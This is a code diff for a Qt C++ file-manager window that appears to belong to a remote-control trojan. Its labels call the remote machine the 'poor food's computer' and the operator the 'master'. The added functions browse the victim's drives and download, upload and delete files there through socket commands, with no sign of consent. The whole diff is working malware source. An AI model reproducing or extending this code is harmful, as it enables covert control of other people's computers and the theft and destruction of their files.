@@ -17,9 +17,9 @@ File::File(QWidget *parent) : QWidget(parent), mSock(nullptr)
 
     // 设置提示
     QLabel *lbFood = new QLabel("可怜的食物的电脑:", this);
-    lbFood->setGeometry(10,10,100,20);
+    lbFood->setGeometry(10,10,150,20);
     QLabel *lbLocal = new QLabel("主人您的电脑:", this);
-    lbLocal->setGeometry(10,300,100,30);
+    lbLocal->setGeometry(10,300,150,30);
 
     // 设置文件列表
     mFoodFileList = new QListWidget(this);
@@ -32,10 +32,10 @@ File::File(QWidget *parent) : QWidget(parent), mSock(nullptr)
     mLocalFileList->setSelectionMode(QListWidget::SelectionMode::ExtendedSelection);
     connect(mLocalFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadLocalDir(QListWidgetItem *)));
 
-    // 客户端列表的操作菜单
+    // 食物列表的操作菜单
     mFoodMenu = new QMenu(this);
-    QAction *actClientRefresh = mFoodMenu->addAction("刷新");
-    connect(actClientRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshFoodList()));
+    QAction *actFoodRefresh = mFoodMenu->addAction("刷新");
+    connect(actFoodRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshFoodList()));
     QAction *actDownload = mFoodMenu->addAction("下载（只能对文件进行操作）");
     connect(actDownload,SIGNAL(triggered(bool)), this,SLOT(downloadFile()));
     QAction *actDelete = mFoodMenu->addAction("删除（只能对文件进行操作）");
@@ -46,8 +46,8 @@ File::File(QWidget *parent) : QWidget(parent), mSock(nullptr)
 
     // 本机列表的操作菜单
     mLocalMenu = new QMenu(this);
-    QAction *actServerRefresh = mLocalMenu->addAction("刷新");
-    connect(actServerRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshLocalList()));
+    QAction *actLocalRefresh = mLocalMenu->addAction("刷新");
+    connect(actLocalRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshLocalList()));
     QAction *actUpload= mLocalMenu->addAction("上传（只能对文件进行操作）");
     connect(actUpload,SIGNAL(triggered(bool)), this,SLOT(uploadFile()));
 
@@ -138,7 +138,7 @@ QList<QByteArray> File::getLocalDirs(QDir dir)
     return baList;
 }
 
-// 这里TM的qt也太方便了吧。。。
+// 这里TM的qt自带方法也太方便了吧。。。
 QList<QByteArray> File::getLocalFiles(QDir dir)
 {
     // 获取本机目录下的文件
@@ -216,7 +216,7 @@ void File::doSendDrives(QHash<QByteArray, QByteArray> &args)
 void File::doSendDirs(QHash<QByteArray, QByteArray> &args)
 {
     // 重设路径
-    _curFoodDir.setPath(QString::fromLocal8Bit(args["DIR"]));
+    _curFoodDir.setPath(codec->toUnicode(args["DIR"]));
 
     // 清空列表
     mFoodFileList->clear();
@@ -286,4 +286,189 @@ void File::refreshFoodList(QDir dir)
         data.append(CmdEnd);
         mSock->write(codec->fromUnicode(data));
     }
+}
+
+void File::downloadFile()
+{
+    QStringList files = getCurrentFile(mFoodFileList);
+    if (mSock) {
+        foreach(QString fileName, files) {
+            // 开始接收文件
+            QDir localDir = _curLocalDir.absoluteFilePath(fileName);
+            QDir foodDir = _curFoodDir.absoluteFilePath(fileName);
+            FileTransfer *ft = new FileTransfer();
+            int port = ft->startRecvFileServer(_userName,localDir.path());
+
+            if (port != -1) {
+                // 发送下载命令
+                QString data;
+                data.append(CmdDownloadFile+CmdSplit);
+                data.append("FILE_PATH"+CmdSplit+foodDir.path()+CmdSplit);
+                data.append("PORT"+CmdSplit+QString::number(port));
+                data.append(CmdEnd);
+                mSock->write(codec->fromUnicode(data));
+            }
+        }
+    }
+}
+
+void File::deleteFile()
+{
+    if (mSock) {
+        // 删除当前文件
+        QStringList files = getCurrentFile(mFoodFileList);
+        if (files.length() > 0) {
+            foreach(QString file, files) {
+                QString path = _curFoodDir.absoluteFilePath(file);
+
+                // 发送数据
+                QString data;
+                data.append(CmdDeleteFile+CmdSplit);
+                data.append("FILE_PATH"+CmdSplit+path);
+                data.append(CmdEnd);
+                mSock->write(codec->fromUnicode(data));
+
+                // 刷新列表
+                refreshFoodList();
+            }
+        }
+    }
+
+}
+
+void File::loadLocalDir(QListWidgetItem *item)
+{
+    // 双击后加载新文件夹
+    if (item->whatsThis() == FileTypeDrive || item->whatsThis() == FileTypeDir) {
+        QDir dir = _curLocalDir;
+        dir.cd(item->text());
+
+        if (dir == _curLocalDir) {
+            dir.setPath("");
+        }
+        _curLocalDir = dir;
+
+        loadLocalDir(dir);
+    }
+}
+
+void File::loadLocalDir(QDir dir)
+{
+    if (dir.path() == "") {
+        // 获取盘符
+        QList<QByteArray> driveList = getLocalDrives();
+
+        // 清空列表
+        mLocalFileList->clear();
+
+        addFilesToList(mLocalFileList, driveList, QFileIconProvider::Drive, FileTypeDrive);
+    } else {
+        // 获取路径
+        QList<QByteArray> dirList = getLocalDirs(dir);
+
+        // 获取文件
+        QList<QByteArray> fileList = getLocalFiles(dir);
+
+        // 清空列表
+        mLocalFileList->clear();
+
+        dirList.push_front(_dirBack);
+        addFilesToList(mLocalFileList, dirList, QFileIconProvider::Folder, FileTypeDir);
+        addFilesToList(mLocalFileList, fileList, QFileIconProvider::File, FileTypeFile);
+    }
+}
+
+void File::refreshLocalList()
+{
+    loadLocalDir(_curLocalDir);
+}
+
+void File::uploadFile()
+{
+    QStringList files = getCurrentFile(mLocalFileList);
+    if (mSock && files.length() > 0) {
+        foreach(QString fileName, files) {
+            // 开始接收文件
+            QDir localDir = _curLocalDir.absoluteFilePath(fileName);
+            QDir foodDir = _curFoodDir.absoluteFilePath(fileName);
+            FileTransfer *ft = new FileTransfer();
+            int port = ft->startSendFileServer(_userName,localDir.path());
+
+            if (port != -1) {
+                // 发送下载命令
+                QString data;
+                data.append(CmdUploadFile+CmdSplit);
+                data.append("FILE_PATH"+CmdSplit+foodDir.path()+CmdSplit);
+                data.append("PORT"+CmdSplit+QString::number(port));
+                data.append(CmdEnd);
+                mSock->write(codec->fromUnicode(data));
+
+            }
+        }
+    }
+}
+
+void File::newConnection(QTcpSocket *s)
+{
+    // 新增食物
+    mSock = new TcpSocket(s, this);
+    connect(mSock,SIGNAL(newData()), this, SLOT(processBuffer()));
+    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));
+
+    // 获取食物盘符
+    refreshFoodList();
+
+    // 获取本机当前目录
+    refreshLocalList();
+
+    // 不再监听新客户
+    mServer->server()->close();
+}
+
+void File::processBuffer()
+{
+    // 从socket里获取缓存区
+    QByteArray *buf = mSock->buffer();
+
+    int endIndex;
+    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
+        // 提取一行指令
+        QByteArray data = buf->mid(0, endIndex);
+        buf->remove(0, endIndex + CmdEnd.length());
+
+        // 提取指令和参数
+        QByteArray cmd, args;
+        int argIndex = data.indexOf(CmdSplit);
+        if (argIndex == -1) {
+            cmd = data;
+        } else {
+            cmd = data.mid(0, argIndex);
+            args = data.mid(argIndex+CmdSplit.length(), data.length());
+        }
+
+        // 处理指令
+        processCommand(cmd, args);
+    }
+}
+
+bool File::eventFilter(QObject *watched, QEvent *event)
+{
+    // 右键弹出菜单
+    if (watched == (QObject*)mFoodFileList) {
+        if (event->type() == QEvent::ContextMenu) {
+            mFoodMenu->exec(QCursor::pos());
+        }
+    } else if (watched==(QObject*)mLocalFileList) {
+        if (event->type() == QEvent::ContextMenu) {
+            mLocalMenu->exec(QCursor::pos());
+        }
+    }
+
+    return QObject::eventFilter(watched, event);
+}
+
+void File::closeEvent(QCloseEvent *)
+{
+    // 删除窗口
+    deleteLater();
 }
